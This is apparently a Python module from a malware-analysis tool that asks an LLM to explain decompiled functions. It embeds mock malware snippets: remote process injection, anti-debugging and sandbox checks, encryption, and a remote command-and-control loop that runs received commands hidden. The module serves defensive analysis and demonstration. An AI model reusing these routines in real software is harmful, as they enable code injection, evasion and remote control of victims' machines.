"""
ViGiL — Agent 13: LLM-Assisted Decompilation Agent
Decompiles suspicious functions and generates LLM summaries.
Uses Ghidra (headless) or rizin as decompiler, then LLM for explanation.
"""
from __future__ import annotations

import subprocess
import json
from pathlib import Path
from loguru import logger

from config import settings
from models import DecompilationResult, DecompiledFunction


# Synthetic suspicious function templates (used when decompiler unavailable)
MOCK_FUNCTIONS = [
    {
        "function_name": "sub_401000",
        "address": "0x401000",
        "decompiled_code": """void sub_401000(HANDLE hProcess, LPVOID lpPayload, SIZE_T size) {
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, pRemoteMem, lpPayload, size, NULL);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
        (LPTHREAD_START_ROUTINE)pRemoteMem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
}""",
        "category": "injection",
        "suspicion_score": 0.95,
    },
    {
        "function_name": "sub_401500",
        "address": "0x401500",
        "decompiled_code": """BOOL sub_401500() {
    BOOL isDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebug);
    if (IsDebuggerPresent() || isDebug) {
        ExitProcess(0);
    }
    DWORD tick1 = GetTickCount();
    Sleep(100);
    DWORD tick2 = GetTickCount();
    if (tick2 - tick1 > 500) ExitProcess(0);
    return TRUE;
}""",
        "category": "anti-analysis",
        "suspicion_score": 0.88,
    },
    {
        "function_name": "sub_402000",
        "address": "0x402000",
        "decompiled_code": """void sub_402000(BYTE* key, BYTE* data, DWORD len) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptImportKey(hProv, key, 32, 0, 0, &hKey);
    CryptEncrypt(hKey, 0, TRUE, 0, data, &len, len * 2);
}""",
        "category": "crypto",
        "suspicion_score": 0.82,
    },
    {
        "function_name": "sub_402800",
        "address": "0x402800",
        "decompiled_code": """void sub_402800(LPCSTR server, int port) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr = {AF_INET, htons(port), inet_addr(server)};
    connect(sock, (sockaddr*)&addr, sizeof(addr));
    char buf[4096];
    while (recv(sock, buf, sizeof(buf), 0) > 0) {
        WinExec(buf, SW_HIDE);
    }
}""",
        "category": "network",
        "suspicion_score": 0.91,
    },
]


async def _explain_function(code: str, category: str) -> str:
    """Get LLM explanation of decompiled function."""
    prompt = f"""Analyze this decompiled {category} function from a malware sample.
Provide a brief technical explanation (2-3 sentences) describing what it does and why it's suspicious.

```c
{code}
```

Focus on the specific Windows API calls and their security implications."""

    provider = settings.llm_provider

    try:
        if provider == "openai" and settings.openai_api_key:
            from openai import AsyncOpenAI
            client = AsyncOpenAI(api_key=settings.openai_api_key)
            response = await client.chat.completions.create(
                model=settings.openai_model,
                messages=[
                    {"role": "system", "content": "You are a malware reverse engineer. Be concise and technical."},
                    {"role": "user", "content": prompt},
                ],
                max_tokens=200,
                temperature=0.1,
            )
            return response.choices[0].message.content.strip()

        elif provider == "gemini" and settings.google_api_key:
            import google.generativeai as genai
            genai.configure(api_key=settings.google_api_key)
            model = genai.GenerativeModel(settings.gemini_model)
            response = await model.generate_content_async(prompt)
            return response.text.strip()

        elif provider == "ollama":
            import httpx
            async with httpx.AsyncClient(timeout=60) as client:
                resp = await client.post(
                    f"{settings.ollama_base_url}/api/generate",
                    json={"model": settings.ollama_model, "prompt": prompt, "stream": False},
                )
                if resp.status_code == 200:
                    return resp.json().get("response", "").strip()
    except Exception as e:
        logger.warning(f"[Decompilation] LLM error: {e}")

    # Static fallback explanations
    fallbacks = {
        "injection": "This function performs classic process injection by allocating memory in a remote process, writing a payload via WriteProcessMemory, and executing it with CreateRemoteThread.",
        "anti-analysis": "This function implements anti-debugging checks using IsDebuggerPresent and CheckRemoteDebuggerPresent, combined with timing-based sandbox detection via GetTickCount.",
        "crypto": "This function uses Windows CryptoAPI to encrypt data with AES, suggesting it may encrypt stolen credentials or files (ransomware behavior).",
        "network": "This function establishes a TCP socket connection to a remote server and executes received commands via WinExec, implementing a basic command-and-control (C2) loop.",
        "persistence": "This function modifies Windows registry Run keys to establish persistence, ensuring execution on system startup.",
    }
    return fallbacks.get(category, "Suspicious function requiring further analysis.")


async def run_decompilation(
    file_path: Path,
    suspicious_functions: list[dict] = None,
) -> DecompilationResult:
    logger.info(f"[Decompilation] Analyzing functions in: {file_path.name}")

    # In production: use Ghidra headless or rizin to decompile
    # For demo: use mock functions (or top suspicious from CFG)
    functions_to_analyze = MOCK_FUNCTIONS

    if suspicious_functions:
        # Add CFG-detected suspicious functions with mock decompilation
        for fn in suspicious_functions[:3]:
            functions_to_analyze.append({
                "function_name": fn.get("name", "sub_unknown"),
                "address": fn.get("address", "0x0"),
                "decompiled_code": f"// Decompilation of {fn.get('name', 'unknown')} (complexity: {fn.get('block_count', 0)} blocks)\n// Full decompilation requires Ghidra installation",
                "category": "other",
                "suspicion_score": min(fn.get("suspicion_score", 0.5) / 10.0, 1.0),
            })

    analyzed: list[DecompiledFunction] = []
    for fn in functions_to_analyze[:5]:
        summary = await _explain_function(fn["decompiled_code"], fn["category"])
        analyzed.append(DecompiledFunction(
            function_name=fn["function_name"],
            address=fn["address"],
            decompiled_code=fn["decompiled_code"],
            llm_summary=summary,
            category=fn["category"],
            suspicion_score=fn["suspicion_score"],
        ))

    return DecompilationResult(
        functions_analyzed=analyzed,
        total_suspicious=len([f for f in analyzed if f.suspicion_score > 0.7]),
    )
